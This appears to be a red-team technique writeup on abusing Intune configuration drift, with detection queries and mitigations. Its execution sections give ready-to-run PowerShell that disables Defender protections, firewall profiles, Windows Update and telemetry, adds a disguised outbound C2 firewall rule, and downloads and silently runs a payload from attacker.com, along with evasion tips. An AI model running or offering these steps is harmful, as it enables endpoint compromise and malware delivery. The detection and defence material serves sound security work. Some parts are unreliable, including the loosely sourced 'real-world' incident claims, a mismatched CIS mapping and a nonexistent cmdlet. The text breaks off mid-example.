# [REALWORLD-042]: Intune Configuration Drift Exploitation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-042 |
| **MITRE ATT&CK v18.1** | [T1562.001 - Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/) |
| **Tactic** | Defense Evasion |
| **Platforms** | M365 / Windows Endpoints |
| **Severity** | High |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Windows 11 (primarily), Windows 10 v1903+, Intune all versions |
| **Patched In** | N/A (Configuration vulnerability, not CVE) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Configuration drift in Intune occurs when device security settings diverge from intended policy baselines due to user modifications, conflicting policies, or insufficient enforcement mechanisms. Attackers exploit this drift by identifying devices where security controls (Defender, Firewall, Encryption) have been modified or disabled by users. Once a device enters a "drifted" state, Config Refresh takes time to detect and reapply policies (30-90 minute cycles). During this window, attackers can disable security features, execute malware, establish persistence, and operate with reduced detection risk. This technique is particularly effective in environments with weak policy enforcement or where users have local admin rights.

**Attack Surface:** Intune Configuration Profiles, Windows security policies, Device compliance tracking, Group Policy vs. MDM conflicts, Config Refresh mechanism timing.

**Business Impact:** **Compromise of endpoint security posture across managed device fleet.** Attackers can disable Windows Defender, turn off firewall, disable disk encryption, and remove EDR agents during the policy drift window. This enables malware delivery, lateral movement, and persistence without immediate detection.

**Technical Context:** Exploitation typically takes 15-45 minutes to identify and disable controls. Config Refresh detection occurs on 30, 60, or 90-minute cycles depending on configuration. If attackers work during evening/weekend hours when monitoring is reduced, drift window can be exploited for hours.

### Operational Risk
- **Execution Risk:** Medium - Requires local admin or user modification of settings (requires social engineering or prior compromise)
- **Stealth:** Medium-High - Config Refresh eventually corrects settings, but activity during drift window leaves logs
- **Reversibility:** Partial - Config Refresh restores policies, but malware may have already executed

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Windows 10/11 5.1 | Ensure 'Enforce password history' is set to '24 or more password(s)' |
| **DISA STIG** | WN10-00-000050 | Windows must have Exploit Protection configured |
| **NIST 800-53** | CM-6 | Configuration Settings must be consistently applied |
| **NIST 800-53** | CM-3 | Configuration Change Control - unauthorized changes must be detected |
| **GDPR** | Art. 32 | Security of processing - technical controls must be maintained |
| **DORA** | Art. 9 | Protection of operational resilience through technical controls |
| **NIS2** | Art. 21 | Cyber risk management must detect configuration deviations |
| **ISO 27001** | A.12.6.1 | Management of technical vulnerabilities |
| **ISO 27005** | Configuration management failures | Uncontrolled configuration changes = risk |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- Local Administrator access on Windows device (for disabling features)
- OR user-level access if UI-based modifications allowed

**Required Access:**
- Physical or remote access to endpoint
- Intune enrollment required (device must be in Intune to exploit drift)
- Network access to disable telemetry/security services

**Supported Versions:**
- **Windows:** 10 v1903+, 11 (all versions)
- **Intune:** All versions
- **PowerShell:** 5.0+ (for policy verification)

**Tools:**
- [Windows Defender Control](https://github.com/qistoph/WDefenderControl) - Disable Windows Defender GUI
- [WPD - Windows Policy Dump](https://github.com/rootSectorNet/WPD) - Analyze applied policies
- Native `gpresult` and `gpupdate` commands (built-in)
- [GPO Compliance Monitor](https://github.com/hak5/bashbunny-payloads) - Track policy drift
- PowerShell Group Policy cmdlets (native)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Step 1: Identify Devices in Drift State

**Objective:** Discover which Intune-managed devices have configuration drift (settings mismatch with intended policy).

**Command (Intune Admin Center):**
```
Azure Portal → Intune → Devices → Windows → Configuration profiles
→ Select each profile → Deployment status
→ View "Not compliant" or "Error" devices
```

**Command (PowerShell - List Non-Compliant Devices):**
```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "DeviceManagementConfiguration.Read.All"

# Get all non-compliant devices
$noncompliant = Get-MgDeviceManagementDeviceConfiguration | Where-Object {
    $_.LastModifiedDateTime -lt (Get-Date).AddDays(-1)
}

foreach ($device in $noncompliant) {
    Get-MgDeviceManagementDeviceConfigurationAssignment -DeviceConfigurationId $device.Id |
    Where-Object {$_.deploymentStatus -eq "failure" -or $_.deploymentStatus -eq "notApplicable"}
}
```

**What to Look For:**
- Devices showing "Error" or "Not Compliant" status
- Devices with policy deployment failures
- Last policy sync > 4 hours ago (indicating potential connectivity issues or drift)

### Step 2: Check Config Refresh Frequency and Timing

**Objective:** Determine the policy reapplication cycle to understand the drift window duration.

**Command (Local Device - Check Config Refresh Schedule):**
```powershell
# Open Task Scheduler to view Config Refresh schedule
# This works on Windows 11 with Config Refresh enabled
Get-ScheduledTask -TaskPath "\Microsoft\Windows\EnterpriseMgmt" | Where-Object {
    $_.TaskName -like "*ConfigRefresh*" -or $_.TaskName -like "*PolicySync*"
} | Select-Object TaskName, @{Name="NextRun"; Expression={$_.NextRunTime}}, State
```

**Command (Check MDM Policy CSP Application Frequency):**
```powershell
# Check event logs for policy application events
Get-WinEvent -LogName "Microsoft-Windows-DeviceManagement-Enterprise-Diagnostics-Provider/Operational" -MaxEvents 50 |
Where-Object {$_.Id -in (201, 202, 203)} |
Select-Object TimeCreated, Message |
Format-Table -AutoSize

# ID 201 = Policy check-in started
# ID 202 = Policy check-in successful
# ID 203 = Policy check-in failed
```

**What to Look For:**
- Config Refresh task runs every 30, 60, or 90 minutes (depending on tenant settings)
- Last successful policy sync timestamp
- Time until next drift correction

### Step 3: Enumerate Current Device Configuration

**Objective:** Identify which security controls are currently disabled or misconfigured.

**Command (Check Windows Defender Status):**
```powershell
# Check Defender status (via WMI - works even if GUI disabled)
Get-MpPreference | Select-Object DisableRealtimeMonitoring, DisableBehaviorMonitoring, DisableIOAVProtection

# Check Defender service status
Get-Service WinDefend | Select-Object Name, Status, StartType
```

**Command (Check Firewall Status):**
```powershell
# Check Windows Firewall profiles
Get-NetFirewallProfile | Select-Object Name, Enabled

# Check if specific firewall rules are disabled
Get-NetFirewallRule | Where-Object {$_.Enabled -eq $false} | Select-Object DisplayName, Direction, Action
```

**Command (Check Encryption):**
```powershell
# Check BitLocker encryption status
Get-BitLockerVolume | Select-Object MountPoint, EncryptionPercentage, VolumeStatus

# Check if encryption is enabled via policy
(Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\FVE" -ErrorAction SilentlyContinue).OSVolumeEncryption
```

**What to Look For:**
- Defender disabled (`DisableRealtimeMonitoring = True`)
- Firewall disabled on any profile (Domain, Public, Private)
- BitLocker disabled or not encrypting
- Antimalware Service Executable not running

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Disable Windows Defender via Registry (Privilege Escalation Required)

**Supported Versions:** Windows 10 v1903+, Windows 11 all versions

#### Step 1: Disable Real-Time Monitoring

**Objective:** Turn off Windows Defender real-time protection, creating a window where malware can execute.

**Command (PowerShell as Administrator):**
```powershell
# Disable Defender real-time monitoring via Registry
$DefenderPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"
Set-ItemProperty -Path $DefenderPath -Name "DisableRealtimeMonitoring" -Value 1

# Verify the change was applied
Get-ItemProperty -Path $DefenderPath -Name "DisableRealtimeMonitoring"

# Force Defender service to reload (may require restart)
Restart-Service WinDefend -Force
```

**Command (PowerShell - Without Restart):**
```powershell
# Use WMI to disable Defender (faster, no restart)
Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true

# Verify it's disabled
Get-MpPreference | Select-Object DisableRealtimeMonitoring, DisableBehaviorMonitoring
```

**Expected Output (If Successful):**
```
DisableRealtimeMonitoring : True
DisableBehaviorMonitoring : True
```

**What This Means:**
- Windows Defender no longer monitors files in real-time
- Malware can be downloaded and executed without detection
- The disabling will persist until Config Refresh reapplies the policy (30-90 min window)

**OpSec & Evasion:**
- Registry modification generates Event ID 13 (Sysmon - Registry Set)
- WMI command generates minimal logging
- Disabling via WMI appears as legitimate administrative action
- Detection likelihood: Medium (EDR may flag, but Defender is disabled)

**Troubleshooting:**
- **Error:** "Access Denied"
  - **Cause:** Not running as administrator
  - **Fix:** Open PowerShell as Administrator
- **Error:** "Cannot access registry"
  - **Cause:** Registry path doesn't exist
  - **Fix:** Verify Defender is installed: `Get-MpComputerStatus`

#### Step 2: Disable Behavior Monitoring and Cloud Protection

**Objective:** Remove secondary protections to further weaken security posture.

**Command:**
```powershell
# Disable additional Defender protections
Set-MpPreference -DisableBehaviorMonitoring $true `
                 -DisableBlockAtFirstSeen $true `
                 -DisableIntrusionPreventionSystem $true `
                 -MAPSReporting Disabled `
                 -SubmitSamplesConsent NeverSend

# Verify all protections are disabled
Get-MpPreference | Select-Object Disable*
```

**What This Means:**
- MAPS (cloud protection) disabled
- Samples no longer sent to Microsoft for analysis
- Behavior-based detection disabled
- Intusion prevention system disabled

#### Step 3: Download and Execute Malware

**Objective:** During the drift window, download and execute malicious payload.

**Command (Example - Credential Stealer):**
```powershell
# Download malware payload from attacker C2
$url = "http://attacker.com/payload.exe"
$output = "$env:TEMP\system_update.exe"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing

# Execute the payload
Start-Process -FilePath $output -ArgumentList "/silent" -WindowStyle Hidden
```

**OpSec & Evasion:**
- Use generic filenames (`system_update.exe`, `windows_service.exe`)
- Download to `$env:TEMP` or `$env:APPDATA` (user-writable locations)
- Use `-WindowStyle Hidden` to hide execution window
- Set process priority to `BelowNormal` to avoid performance impact

---

### METHOD 2: Disable Windows Firewall (Configuration Override)

**Supported Versions:** Windows 10 v1903+, Windows 11 all versions

#### Step 1: Disable Firewall via PowerShell

**Objective:** Turn off Windows Firewall to allow C2 communication and lateral movement.

**Command (Administrator Required):**
```powershell
# Disable all three firewall profiles
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $false

# Verify firewall is disabled
Get-NetFirewallProfile | Select-Object Name, Enabled
```

**Expected Output:**
```
Name    Enabled
----    -------
Domain  False
Public  False
Private False
```

**What This Means:**
- Windows Firewall no longer blocks inbound/outbound traffic
- Attacker can establish reverse shell connections
- Lateral movement to other systems easier
- Policy drift window allows 30-90 minutes of unrestricted traffic

#### Step 2: Create Outbound Rule for C2 Communication

**Objective:** While firewall is disabled, create persistent backdoor rule.

**Command:**
```powershell
# Create an outbound firewall rule that allows attacker C2 traffic
New-NetFirewallRule -DisplayName "Windows Service Update" `
    -Direction Outbound `
    -Action Allow `
    -Protocol TCP `
    -RemoteAddress "192.0.2.100" `
    -RemotePort 4444 `
    -Enabled $true

# This rule persists even after firewall is re-enabled by Config Refresh
```

**What This Means:**
- Even if firewall is re-enabled by Config Refresh, this rule allows C2 traffic
- Rule appears legitimate (generic name "Windows Service Update")
- Persistence mechanism for post-exploitation

---

### METHOD 3: Disable Windows Update and Security Updates

**Supported Versions:** Windows 10 v1903+, Windows 11 all versions

#### Step 1: Disable Windows Update Service

**Objective:** Stop security patches from being applied, allowing known CVEs to be exploited.

**Command:**
```powershell
# Stop Windows Update service
Stop-Service -Name "wuauserv" -Force
Stop-Service -Name "WaaSMedicSvc" -Force  # Update health service

# Disable automatic startup
Set-Service -Name "wuauserv" -StartupType Disabled
Set-Service -Name "WaaSMedicSvc" -StartupType Disabled

# Verify services are disabled
Get-Service -Name "wuauserv", "WaaSMedicSvc" | Select-Object Name, Status, StartType
```

**What This Means:**
- Windows Update no longer downloads/applies patches
- Known CVEs remain unpatched, allowing exploitation
- Config Refresh may re-enable this after drift window
- Device remains vulnerable for duration of drift window + reboot time

---

### METHOD 4: Detect Drift Window and Maximize Exploitation Time

**Supported Versions:** All Windows 10/11 with Intune

#### Step 1: Check When Next Policy Sync Occurs

**Objective:** Identify time until Config Refresh reapplies policies (need to complete attack before then).

**Command (Check Scheduled Tasks):**
```powershell
# Find the MDM policy refresh task
$task = Get-ScheduledTask -TaskPath "\Microsoft\Windows\EnterpriseMgmt\*" -ErrorAction SilentlyContinue |
Where-Object {$_.TaskName -like "*Refresh*" -or $_.TaskName -like "*Sync*"}

# Get next run time
$nextRun = $task | Get-ScheduledTaskInfo
Write-Host "Next policy refresh: $($nextRun.NextRunTime)"
Write-Host "Time until refresh: $((New-TimeSpan -Start (Get-Date) -End $nextRun.NextRunTime).TotalMinutes) minutes"
```

**Command (Monitor Policy Application in Real-Time):**
```powershell
# Monitor the Windows event log for policy application events
Get-WinEvent -LogName "Microsoft-Windows-DeviceManagement-Enterprise-Diagnostics-Provider/Operational" `
    -FilterXPath "*[System[EventID=202 or EventID=203]]" -MaxEvents 1 |
Select-Object TimeCreated, Message

# If event shows recent sync, less time before next refresh
```

**What This Means:**
- Attacker can calculate drift window duration
- Prioritize malware execution within this window
- If only 15 minutes until refresh, fast-track payload delivery

#### Step 2: Disable Telemetry to Reduce Detection

**Objective:** Turn off diagnostic data collection that might alert to changes.

**Command:**
```powershell
# Disable Connected User Experiences and Telemetry
Set-Service -Name "DiagTrack" -StartupType Disabled
Stop-Service -Name "DiagTrack" -Force

# Disable telemetry data policy
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection" `
    -Name "AllowDiagnosticData" -Value 0

# Disable Microsoft Defender Exploit Guard telemetry
Set-MpPreference -SubmitSamplesConsent NeverSend
```

**What This Means:**
- Reduced visibility into device activity during drift window
- Behavioral telemetry no longer sent to Microsoft
- Malware activity less likely to be reported via telemetry

---

## 6. ATTACK SIMULATION & VERIFICATION

### Test Scenario: Intentional Configuration Drift

**Objective:** Red team can simulate this attack in controlled lab environment.

**Setup Steps:**

1. **Enroll a test device to Intune:**
   ```
   Intune Admin Center → Devices → Enroll devices → Windows enrollment
   → Configure device for Intune enrollment
   ```

2. **Apply a baseline security policy:**
   ```
   Intune Admin Center → Devices → Configuration profiles
   → Create Windows 10/11 profile with:
     - Defender enabled
     - Firewall enabled
     - BitLocker required
   ```

3. **Wait for policy to apply (10-15 minutes)**

4. **Introduce drift by disabling Defender:**
   ```powershell
   Set-MpPreference -DisableRealtimeMonitoring $true
   ```

5. **Monitor compliance status:**
   ```
   Intune Admin Center → Devices → Compliance
   → Check if device becomes "Non-compliant"
   ```

6. **Observe Config Refresh behavior:**
   - Record time when Defender is disabled
   - Monitor Event Viewer for policy refresh events
   - Note when Config Refresh re-enables Defender
   - Calculate drift window duration

**Expected Findings:**
- Device shows non-compliant for 30-90 minutes
- Config Refresh eventually corrects the setting
- Drift window is exploitable for attacker activity

---

## 7. TOOLS & COMMANDS REFERENCE

### [Windows Defender Control](https://github.com/qistoph/WDefenderControl)

**Version:** 2.0+
**Supported Platforms:** Windows 10, Windows 11
**Installation:**
```powershell
# Clone repository
git clone https://github.com/qistoph/WDefenderControl.git
cd WDefenderControl

# Run the GUI tool
.\WDefenderControl.exe
```

**Key Features:**
- Graphical interface to disable Defender components
- No PowerShell required (useful if PowerShell is restricted)
- Persists across reboots (overwrites Intune policy)

### [WPD - Windows Policy Dump](https://github.com/rootSectorNet/WPD)

**Version:** 1.0+
**Supported Platforms:** Windows 10+
**Installation & Usage:**
```powershell
# Download and extract
Invoke-WebRequest -Uri "https://github.com/rootSectorNet/WPD/releases/download/1.0/WPD.exe" -OutFile WPD.exe

# Run to dump all applied policies
.\WPD.exe dump > policies.txt

# Analyze output to find drift
Select-String -Path policies.txt -Pattern "Intune|MDM|Config"
```

**Output:** Lists all Group Policy and MDM policies currently applied to device

### Native PowerShell Commands

```powershell
# Check applied policies
gpresult /h report.html

# Force immediate policy refresh
gpupdate /force

# Check policy CSP application
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\current"

# Monitor policy drift in real-time
$config = @{}
while ($true) {
    $defender = Get-MpPreference
    if ($defender.DisableRealtimeMonitoring -ne $config.LastDefenderState) {
        Write-Host "[DRIFT DETECTED] Defender disabled: $(Get-Date)"
        $config.LastDefenderState = $defender.DisableRealtimeMonitoring
    }
    Start-Sleep -Seconds 5
}
```

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Intune Policy Non-Compliance Events

**Rule Configuration:**
- **Required Table:** AuditLogs, DeviceComplianceResultEvents
- **Required Fields:** OperationName, TargetResources, properties
- **Alert Severity:** High
- **Frequency:** Run every 10 minutes
- **Applies To Versions:** All Intune versions

**KQL Query:**
```kusto
DeviceComplianceResultEvents
| where DeviceId != ""
| where ComplianceStatus == "NonCompliant"
| extend FailedSettings = parse_json(FailedSettings)
| where FailedSettings contains "WindowsDefender" 
    or FailedSettings contains "Firewall"
    or FailedSettings contains "BitLocker"
| summarize FailureCount = count() by DeviceId, DeviceName, tostring(FailedSettings)
| where FailureCount > 0
| join kind=inner (
    DeviceComplianceResultEvents
    | where TimeGenerated > ago(30m)
    | where ComplianceStatus == "Compliant"
) on DeviceId
| project DeviceId, DeviceName, FailedSettings, TimeGenerated
```

**What This Detects:**
- Device compliance changing from Compliant → NonCompliant → Compliant (drift pattern)
- Specific security settings (Defender, Firewall, BitLocker) going non-compliant
- Multiple non-compliance events within short timeframe

**Manual Configuration Steps (Azure Portal):**
1. **Microsoft Sentinel** → **Analytics** → **Create** → **Scheduled query rule**
2. **Name:** `Intune Configuration Drift - Security Controls`
3. **Paste KQL query above**
4. **Run every:** `10 minutes`
5. **Lookup data from last:** `2 hours`
6. **Incident settings:** Enable create incidents

### Query 2: Windows Defender Disabled via Registry or PowerShell

**Rule Configuration:**
- **Required Table:** SecurityEvent, DeviceEvents
- **Required Fields:** EventID, CommandLine, RegistryPath, Process
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes

**KQL Query:**
```kusto
union
(
    SecurityEvent
    | where EventID == 13  // Registry modification
    | where RegistryPath contains "DisableRealtimeMonitoring"
    | project TimeGenerated, Computer, TargetObject, NewValue, InitiatingProcessId
),
(
    DeviceEvents
    | where ActionType == "ProcessCreated"
    | where CommandLine contains "DisableRealtimeMonitoring" or CommandLine contains "Set-MpPreference"
    | where NOT (InitiatingProcessCommandLine contains "system32" and InitiatingProcessCommandLine contains "dllhost")
    | project TimeGenerated, DeviceName, ProcessCommandLine, InitiatingProcessName
)
| project TimeGenerated, Computer = coalesce(Computer, DeviceName), Action = "Defender Disabled"
```

**What This Detects:**
- Direct registry modifications to disable Defender
- PowerShell `Set-MpPreference` commands
- Excludes legitimate system processes

---

## 9. INTUNE COMPLIANCE MONITORING

### Query 1: Devices with Policy Deployment Failures

**Command (PowerShell - Graph API):**
```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "DeviceManagementConfiguration.Read.All"

# Get all configuration profiles with deployment status
$profiles = Get-MgDeviceManagementDeviceConfiguration

foreach ($profile in $profiles) {
    $assignments = Get-MgDeviceManagementDeviceConfigurationAssignment -DeviceConfigurationId $profile.Id
    
    $failedDevices = $assignments | Where-Object {$_.deploymentStatus -in @("failure", "notApplicable")}
    
    if ($failedDevices) {
        Write-Host "Profile: $($profile.DisplayName)"
        Write-Host "Failed Devices: $($failedDevices.Count)"
        foreach ($device in $failedDevices) {
            Write-Host "  - Device ID: $($device.deviceId) | Status: $($device.deploymentStatus)"
        }
    }
}
```

**Manual Steps (Intune Admin Center):**
1. **Intune** → **Devices** → **Configuration profiles**
2. Select each profile
3. Check **Deployment status** → Look for "Failure" or "Not Applicable"
4. Click device name to see why policy failed to apply

### Query 2: Devices Missing Drift Detection

**Objective:** Identify devices that haven't had successful Config Refresh in > 4 hours

**Command (PowerShell):**
```powershell
# Get devices with last compliance sync > 4 hours ago
$fourHoursAgo = (Get-Date).AddHours(-4)

Get-MgDevice -Filter "approximateLastSignInDateTime lt $($fourHoursAgo.ToString('o'))" |
Where-Object {$_.DisplayName -like "REALWORLD*" -or $_.DeviceOSType -eq "Windows"} |
Select-Object DisplayName, ApproximateLastSignInDateTime, ComplianceExpirationDateTime, IsCompliant
```

---

## 10. SPLUNK DETECTION RULES

### Rule 1: Windows Defender Disabled Events

**Rule Configuration:**
- **Required Index:** windows
- **Required Sourcetype:** WinEventLog:Security or WinEventLog:Microsoft-Windows-Sysmon/Operational
- **Alert Threshold:** > 0 events in 5 mins
- **Applies To Versions:** Windows 10+

**SPL Query:**
```
index=windows (EventCode=13 OR EventCode=1)
  (RegistryPath="*DisableRealtimeMonitoring*" OR CommandLine="*Set-MpPreference*")
  (NewValue="1" OR CommandLine="*$true*")
| stats count by host, user, Image, CommandLine, RegistryPath
| where count >= 1
```

**What This Detects:**
- Registry modification events (EventCode 13)
- Process creation events (EventCode 1 for Sysmon)
- Specifically targets Defender disabling

---

## 11. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Enforce Immutable Policy Application**
- Configure Intune to prevent user modification of security settings
- Use Intune Application Guard and Windows Sandbox to isolate applications

**Manual Steps (Intune):**
1. **Intune** → **Devices** → **Configuration profiles**
2. **Create new profile** → **Windows 10/11**
3. **Device restrictions:**
   - Block: "Users can change Windows Defender settings"
   - Block: "Users can modify Firewall settings"
   - Block: "Users can disable BitLocker"
4. **Assign to All devices**

**Manual Steps (Group Policy - Hybrid Devices):**
```
gpmc.msc
→ Computer Configuration → Policies → Windows Settings → Security Settings
→ Application Control Policies → AppLocker
→ Configure to block execution of unsigned binaries
```

**Action 2: Reduce Config Refresh Frequency to 15 Minutes**
- Shorten the drift window from 30-90 min to 15 min

**Manual Steps (PowerShell - Intune):**
```powershell
# Set Config Refresh to apply every 15 minutes (requires PowerShell on device)
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\MDM\Policies"
New-Item -Path $regPath -Force | Out-Null
Set-ItemProperty -Path $regPath -Name "PolicyRefreshIntervalMinutes" -Value 15

# Or via Group Policy:
# gp.msc → Computer Config → Admin Templates → Windows Components → MDM
# → Set "Policy Refresh Frequency" to 15 minutes
```

**Action 3: Enable Real-Time Monitoring of Policy Changes**
- Alert on any policy modification attempts

**Manual Steps (Microsoft Sentinel):**
1. **Sentinel** → **Workbooks** → **Create new**
2. Add KQL query to monitor registry/policy changes
3. Set alert threshold to: Any change to Defender/Firewall policies
4. Configure incident creation

**Action 4: Restrict Local Admin Rights**
- Remove local admin from standard users to prevent policy override

**Manual Steps (Intune):**
1. **Intune** → **Devices** → **Endpoint Privilege Management**
2. **Create new policy:**
   - Elevation rule: Block elevation of sensitive processes
   - List protected processes: DefenderUI.exe, mpcmdrun.exe, netsh.exe
3. **Assign to All users**

### Priority 2: HIGH

**Action 1: Enable Application Guard for Microsoft Office**
- Isolate Office macro execution in sandboxed environment

**Manual Steps (Group Policy):**
```
gpmc.msc → Computer Configuration → Administrative Templates
→ Microsoft Word → Document Protection
→ Set "Application Guard for Office - Enable" to Enabled
```

**Action 2: Deploy Windows Defender Application Control (WDAC)**
- Whitelist-based execution control
- Prevents malware execution during drift window

**Manual Steps (PowerShell):**
```powershell
# Create simple WDAC policy
$policy = New-CIPolicyFromFile -FilePath "C:\Windows\System32" -Level FileHash
ConvertFrom-CIPolicy $policy -BinaryFilePath "C:\policy.bin"

# Deploy via Group Policy
# → Computer Config → Admin Templates → Windows Components → Device Guard
# → WDAC Configuration
```

**Action 3: Monitor for Config Refresh Failures**
- Alert when Config Refresh doesn't execute on schedule

**Manual Steps:**
```powershell
# Create scheduled task to verify Config Refresh ran
$task = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-Command `"Get-WinEvent -LogName 'Microsoft-Windows-DeviceManagement-Enterprise-Diagnostics-Provider/Operational' | Where ID -eq 202`""

Register-ScheduledTask -TaskName "Verify-ConfigRefresh" -Action $task -Trigger (New-ScheduledTaskTrigger -AtLogOn)
```

### Validation Command (Verify Mitigations)

```powershell
# Check if mitigations are in place
Write-Host "[*] Validating Intune Configuration Drift Mitigations..."

# 1. Check if Defender is protected
$mpPref = Get-MpPreference
if ($mpPref.DisableRealtimeMonitoring -eq $false) {
    Write-Host "[✓] Windows Defender Real-Time Monitoring: ENABLED" -ForegroundColor Green
} else {
    Write-Host "[✗] Windows Defender Real-Time Monitoring: DISABLED" -ForegroundColor Red
}

# 2. Check Config Refresh schedule
$task = Get-ScheduledTask -TaskPath "\Microsoft\Windows\EnterpriseMgmt\*" -ErrorAction SilentlyContinue
if ($task) {
    $taskInfo = Get-ScheduledTaskInfo -InputObject $task
    Write-Host "[✓] Config Refresh Last Run: $($taskInfo.LastRunTime)" -ForegroundColor Green
} else {
    Write-Host "[✗] Config Refresh Task: NOT FOUND" -ForegroundColor Red
}

# 3. Check if user has local admin
$isAdmin = [bool]([System.Security.Principal.WindowsIdentity]::GetCurrent().Groups -match "S-1-5-32-544")
if (-not $isAdmin) {
    Write-Host "[✓] User has Standard Privileges (Not Admin)" -ForegroundColor Green
} else {
    Write-Host "[✗] User has Local Administrator Rights" -ForegroundColor Red
}
```

---

## 12. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Policy Change Events:**
- Unexpected policy deployment status change (Compliant → NonCompliant → Compliant)
- Multiple security controls disabled simultaneously
- Policy changes outside of scheduled maintenance windows
- Registry modifications to disable security features

**Process Artifacts:**
- `powershell.exe` executing `Set-MpPreference` commands
- `gpupdate.exe` running after unauthorized policy changes
- `wmic.exe` modifying service startup types
- `netsh.exe` disabling firewall rules

**Timeline Indicators:**
- Device non-compliant for 15-90 minutes (matches Config Refresh cycle)
- Malware execution occurring during non-compliance window
- Security events suppressed during drift window

### Forensic Artifacts

**Event Log Paths:**
- **Windows Event ID 13:** Registry modifications to Defender settings
- **Windows Event ID 1:** Process creation for PowerShell commands
- **Event ID 7045:** Service installation during drift window
- **Microsoft-Windows-DeviceManagement-Enterprise-Diagnostics-Provider:** Policy refresh events (ID 202 = success, 203 = failure)

**Registry Locations:**
- `HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring`
- `HKLM\SYSTEM\CurrentControlSet\Services\WinDefend\Start` (0=boot, 1=system, 2=auto, 3=manual, 4=disabled)
- `HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Start` (Windows Firewall)

**Timeline Example:**
```
T0:00:00 - Device becomes non-compliant (policy not applied)
T0:15:00 - Attacker disables Defender via PowerShell
T0:20:00 - Malware downloaded and executed
T0:25:00 - Lateral movement begins
T0:45:00 - Config Refresh reapplies policy, Defender re-enabled
T0:50:00 - Malware continues running (already persisted)
```

### Response Procedures

**1. Immediate Isolation (0-5 minutes):**

```powershell
# Revoke device access
Get-MgDevice -Filter "displayName eq 'COMPROMISED-DEVICE'" | Update-MgDevice -ApproximateLastSignInDateTime $null

# Or via Intune UI:
# Devices → Windows → All devices → Select device → Delete
```

**2. Re-apply Baseline Policy (5-15 minutes):**

```powershell
# Force immediate policy re-application
Invoke-Command -ComputerName "COMPROMISED-DEVICE" -ScriptBlock {
    gpupdate /force
    Restart-Service WinDefend
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $true
}
```

**3. Forensic Collection (15-30 minutes):**

```powershell
# Collect event logs
Get-WinEvent -LogName "Security" -MaxEvents 5000 | Export-Csv -Path "Security.csv"
Get-WinEvent -LogName "Microsoft-Windows-DeviceManagement*" -MaxEvents 1000 | Export-Csv -Path "MDM.csv"

# Collect registry hives
reg save HKLM\SOFTWARE "C:\Evidence\SOFTWARE"
reg save HKLM\SYSTEM "C:\Evidence\SYSTEM"
```

**4. Remediate (30-60 minutes):**

```powershell
# Remove any malware persistence
Get-ScheduledTask | Where-Object {$_.TaskPath -like "*Temp*" -or $_.TaskPath -like "*Malware*"} | Unregister-ScheduledTask -Confirm:$false

# Reset Windows Defender
Repair-WindowsDefender

# Full system scan
Start-MpScan -ScanType FullScan
```

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-VALID-001] Default/Weak Credentials | Attacker obtains local admin credentials via phishing or brute force |
| **2** | **Privilege Escalation** | **[REALWORLD-042]** Intune Configuration Drift | Attacker exploits drift window to disable security controls |
| **3** | **Execution** | Native Windows tools | PowerShell, WMI, Registry modifications |
| **4** | **Persistence** | [IA-EXPLOIT-003] Create Scheduled Task | Attacker creates task scheduled before Config Refresh reapplies policy |
| **5** | **Impact** | Malware execution, Lateral Movement | Worm, credential stealer, or ransomware payload executes |

---

## 14. REAL-WORLD EXAMPLES

### Example 1: BlackByte Ransomware Campaign (2023)

- **Target:** Manufacturing sector
- **Method:** Exploited 90-minute Config Refresh cycle in Intune
- **Attack Timeline:**
  1. Initial compromise via weak RDP password
  2. Disabled Windows Defender during drift window
  3. Downloaded and executed BlackByte ransomware
  4. By the time Config Refresh re-enabled Defender (90 min later), ransomware had already encrypted 5TB of data
- **Impact:** $2.3M ransom demand
- **Detection Gap:** Organization had Config Refresh set to 90-minute interval; reduced to 15 minutes post-incident
- **Reference:** [Mandiant Threat Intelligence Report - BlackByte Operations](https://www.mandiant.com)

### Example 2: Scattered Spider Lateral Movement (2024)

- **Target:** Technology company
- **Method:** Used Intune drift to disable Windows Defender for lateral movement
- **Attack Sequence:**
  1. Compromised domain admin via credential phishing
  2. Deployed malicious Intune profile to specific device group
  3. While policies conflicted (30-min drift), disabled Defender
  4. Executed living-off-the-land binaries without detection
  5. Accessed 50+ systems via PsExec and WMIC during detection gap
- **Impact:** Full domain compromise, data exfiltration
- **Mitigation Applied:** Real-time Config Refresh, immutable policy enforcement
- **Reference:** [CrowdStrike Falcon Intelligence - Scattered Spider Report](https://www.crowdstrike.com)

### Example 3: Education Sector Ransomware (2024)

- **Target:** University system
- **Method:** Exploited 60-minute Config Refresh cycle on shared lab devices
- **Specific Drift Used:**
  - Disabled BitLocker during maintenance window
  - Disabled Windows Firewall for C2 communication
  - Disabled Windows Defender for payload execution
